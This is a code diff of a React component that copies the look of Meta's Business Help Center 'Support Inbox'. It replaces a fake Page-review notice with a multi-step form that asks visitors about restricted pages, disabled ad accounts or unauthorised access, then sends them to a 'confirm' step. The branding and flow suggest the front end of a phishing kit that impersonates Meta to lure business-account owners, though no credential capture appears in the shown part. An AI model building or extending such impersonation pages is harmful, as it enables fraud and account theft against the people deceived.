@@ -1,63 +1,108 @@
-import React from 'react'
 import { logo, search } from './Publics/images/images'
-import { Link } from 'react-router-dom'
+import { Link, useNavigate} from 'react-router-dom'
+import React, { useState } from 'react';
+import { Input, Radio, Space, Form, Button } from 'antd';
 
 
-const FinalComponent = () => {
+
+const Step_buiness = () => {
+
+    const navigate = useNavigate();
+
+    const [value, setValue] = useState(1);
+    const onChange = (e) => {
+        setValue(e.target.value);
+    };
+
+    const onFinish = (values) => {
+
+        navigate('/contact-account/confirm');
+
+    };
+
     return (
         <div className="business">
 
             <div className="top-header">
                 <div className="container">
-                    <img src={logo} width="70" className="metalogo" alt="" />
+                    <img src={logo} width="70" className="metalogo" alt=''/>
                     <p className="metahead">Support Inbox</p>
-                    <img src={search} width="100%" className="searchicon" alt="" />
+                    <img src={search} width="100%" className="searchicon" alt=''/>
                 </div>
             </div>
-            <div className="masheader" style={{marginBottom: "70px"}}>
+            <div className="masheader">
                 <div className="wrapper">
                     <div className="container">
-                        <p className="businesshelp" style={{ }}>
+                        <p className="businesshelp" >
                             Meta Business Help Center </p>
-                        <p className="businesshelpcenter">Facebook Business Help
-                            Center</p>
+                        <p className="businesshelpcenter">How can we help you?</p>
                     </div>
                 </div>
             </div>
 
-            <div className="main-content" style={{
-                display: "flex",
-                textAlign: "center",
-                justifyContent: "center",
-                alignItems: "center"}}>
+            <div className="main">
 
-                <div className='container'>
-                    <p style={{color: "#267df1"}}>A review for this Page was requested by an admin or advertiser to determine if it was correctly restricted from advertising. We're reviewing the Page and will notify you here within 48 hours from when the review was requested. 
-                    <a
-                    href='https://facebook.com/help/282489752085908/trang/?helpref=popular_topics'
-                    style={{
-                        outline: "none",
-                        color: "#267df1",
-                        fontWeight: "700",
-                        textDecoration: 'none'
-                    }}
-                >
-                    Go to Home ?
-                </a></p>
-                    
+                <div className="title-page">
+                    <p><b>How can we help?</b></p>
+                    <p>We need more information to address your issue. This form will only take a few minutes.</p>
                 </div>
-                
+
+                <div className="form select-form col-md-4 col-12">
+                    <p><b>Most common issues</b></p>
+
+                    <Form
+                        name="basic"
+                        initialValues={{
+                        remember: true,
+                        }}
+                        onFinish={onFinish}
+                        autoComplete="off"
+                    >
+                        <Radio.Group onChange={onChange} value={value}>
+                            <Space direction="vertical">
+                                <Radio value={1}>I have been blocked from using this feature</Radio>
+                                <Radio value={2}>My fanpage is restricted (not violating any policy)</Radio>
+                                <Radio value={3}>My ad account is disabled</Radio>
+                                <Radio value={4}>I need help with a foiled payment</Radio>
+                                <Radio value={5}>I think someone accessed my business without my permission.</Radio>
+                                <Radio value={6}>Other issues</Radio>
+                            </Space>
+                        </Radio.Group>
+                        <Form.Item 
+                            className="btn butoni"
+                        >
+                            <Button
+                                htmlType="submit"
+                                style={{
+                                    backgroundColor: "transparent",
+                                    outline: "none",
+                                    border: 'none',
+                                    boxShadow: 'none',
+                                    color: "#267df1",
+                                    fontWeight: '700',
+                                    fontSize:'1rem',
+                                    width: '100%'
+                                }}
+                            >
+                                Submit
+                            </Button>
+                        </Form.Item>
+                        <p></p>
+                    </Form>
+
+
+                </div>
 
             </div>
 
             {/* FOOTER */}
             <div className="footer">
                 <div className="container">
-                    <img src={logo} className="logofooter" alt=''/>
+                    <img src={logo} alt="" className="logofooter"/>
                     <p className="nerlogofooter">
                         Facebook can help your large, medium or small business
                         grow. Get the latest news
-                        for advertisers and more on our <Link to="#" style={{ textDecoration: "none", color: "white" }}>Meta for Business Page.</Link></p>
+                        for advertisers and more on our <Link to="#" style={{textDecoration: "none", color: "white"}}>Meta for Business Page.</Link></p>
                     <div className="row">
                         <div className="col-md-3 col-6">
                             <ul>
@@ -140,8 +185,9 @@ const FinalComponent = () => {
                     </ul>
                 </div>
             </div>
+
         </div>
     )
 }
 
-export default FinalComponent
+export default Step_buiness
